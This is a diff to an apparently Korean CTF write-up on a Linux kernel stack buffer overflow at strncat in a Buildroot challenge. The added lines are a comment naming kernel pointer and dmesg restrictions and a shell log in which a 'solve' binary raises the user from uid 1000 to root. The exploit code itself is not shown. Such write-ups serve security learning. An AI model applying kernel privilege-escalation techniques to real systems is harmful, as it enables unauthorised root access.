@@ -435,6 +435,8 @@ strncat 위치에서 kernel stack overflow가 떴다.
 Kernel Stack BOF를 통해 rip를 제어할 수 있게 되었으므로
 
 ## 추가중
+<!-- kptr_restrict / dmesg_restrict -->
+
 **Final Exploit Code**
 ```c
 #include <stdio.h>
@@ -521,11 +523,17 @@ int main() {
 
 ## Result
 ```sh
+Welcome to Buildroot
+buildroot login: blazeme
+Password:
+login: can't change directory to '/home/blazeme'
 $ ls
 bin         lib64       mnt         run         tmp
 dev         linuxrc     opt         sbin        usr
 etc         lost+found  proc        solve       var
 lib         media       root        sys
+$ id
+uid=1000(blazeme) gid=1000(blazeme) groups=1000(blazeme)
 $ ./solve
 $ id
 uid=0(root) gid=0(root)
